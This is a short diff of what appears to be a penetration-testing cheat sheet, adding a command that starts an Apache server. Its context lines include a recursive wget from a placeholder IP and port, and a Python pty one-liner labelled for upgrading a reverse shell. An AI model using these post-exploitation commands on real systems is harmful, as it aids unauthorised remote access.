@@ -6,4 +6,7 @@ wget -r http://<ip address>:<port>
 # update reverse shell 
 python -c 'import pty; pty.spawn("/bin/bash")'  
 
+# start apache server
+/etc/init.d/apache2 start
+
 
